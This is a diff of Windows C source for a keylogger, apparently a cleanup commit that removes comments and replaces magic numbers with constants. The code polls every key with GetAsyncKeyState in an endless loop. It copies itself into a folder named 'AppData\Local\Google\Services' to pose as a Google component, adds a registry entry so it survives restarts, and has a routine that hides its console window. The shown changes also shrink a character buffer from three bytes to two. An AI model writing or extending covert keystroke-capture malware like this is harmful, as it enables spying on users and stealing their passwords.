@@ -71,7 +71,7 @@ char mapWithShift(int key) {
 }
 
 void handleKeyPress(int key) {
-    char keyChar[3] = {0};
+    char keyChar[2] = {0}; 
 
     // Handle special keys:
     if (handleSpecialKeys(key))
@@ -142,7 +142,7 @@ void handleKeyRelease(int key) {
 
 void create_directory(char *targetPath) {
     struct stat st = {0};
-    
+
     if (stat(targetPath, &st) == -1) {
         if (_mkdir(targetPath) == 0) {
             printf("Directory created successfully: %s\n", targetPath);
@@ -154,20 +154,15 @@ void create_directory(char *targetPath) {
     }
 }
 
-// Function to copy the executable to AppData\Roaming
 void copyToSystemLocation(char *targetPath) {
     char username[256];
     DWORD username_len = sizeof(username);
 
-    // Get the current username
     if (!GetUserName(username, &username_len)) {
         printf("Failed to get username. Error code: %lu\n", GetLastError());
         return;
     }
-
    
-
-    // Construct target path
     if (snprintf(targetPath, MAX_PATH, "C:\\Users\\%s\\AppData\\Local\\Google\\Services", username) >= MAX_PATH) {
         printf("Path length exceeds MAX_PATH limit.\n");
         return;
@@ -175,13 +170,11 @@ void copyToSystemLocation(char *targetPath) {
 
     create_directory(targetPath);
 
-    // Construct target path
     if (snprintf(targetPath, MAX_PATH, "C:\\Users\\%s\\AppData\\Local\\Google\\Services\\%s", username, NEWFILE) >= MAX_PATH) {
         printf("Path length exceeds MAX_PATH limit.\n");
         return;
     }
 
-    // Copy the file
     if (!CopyFile(OLDFILE, targetPath, FALSE)) {
         DWORD dwError = GetLastError();
         printf("Error copying file. Error code: %lu\n", dwError);
@@ -190,7 +183,6 @@ void copyToSystemLocation(char *targetPath) {
     }
 }
 
-// Function to set registry persistence for the copied file
 void setRegistryPersistence(const char *targetPath) {
     HKEY hKey;
 
@@ -203,29 +195,26 @@ void setRegistryPersistence(const char *targetPath) {
     }
 }
 
-// Main persistence function
 void persistence() {
     char targetPath[MAX_PATH];
-    copyToSystemLocation(targetPath);  // Copy itself to AppData\Roaming
-    setRegistryPersistence(targetPath); // Set registry to point to copied location
+    copyToSystemLocation(targetPath); 
+    setRegistryPersistence(targetPath); 
 }
 
-// Function to hide the console window
 void hideConsole() {
-    HWND stealth;
-    stealth = GetConsoleWindow();
+    HWND stealth = GetConsoleWindow();
     ShowWindow(stealth, SW_HIDE);
 }
 
 int main() {
-    //hideConsole();  // Hide the console
+    // hideConsole();
     persistence();
 
-    int keyStates[256] = {0};
+    int keyStates[KEY_CODE_MAX] = {0};
 
     while (1) {
-        Sleep(10);
-        for (int key = 8; key < 256; key++) {
+        Sleep(SLEEP_INTERVAL_MS);
+        for (int key = KEY_CODE_MIN; key < KEY_CODE_MAX; key++) {
             SHORT keyState = GetAsyncKeyState(key);
             if (keyState & KEY_PRESSED) {
                 if (!keyStates[key]) {
